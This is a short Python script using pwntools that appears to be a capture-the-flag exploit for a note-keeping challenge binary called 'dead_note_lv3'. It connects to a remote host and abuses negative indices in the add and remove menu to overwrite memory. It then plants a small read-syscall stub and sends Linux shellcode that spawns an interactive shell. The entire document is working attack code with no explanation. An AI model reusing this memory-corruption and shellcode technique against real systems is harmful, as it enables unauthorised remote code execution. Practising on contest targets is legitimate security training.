from pwn import *

#r = process(["./dead_note_lv3"])
r = remote("159.89.197.67", 31337)
context.arch = "amd64"

def add(idx,num,text):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(num))
	if len(text)<8 :
		r.sendlineafter(":",text)
	else:
		r.sendafter(":",text)

def remove(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))

add(0,0x261-2,"a")
add(-1,1,"Xu6")
add(0,1,"Xu6")
remove(-1)
add(-0xc,1,"6u6")
#input(":")
add(-0x18,1,asm("push 0x0\npop rax\npush rax\npop rdi\nsyscall"))
r.send("a"*7+asm(shellcraft.amd64.linux.sh()))
r.recvn(1)
r.interactive()
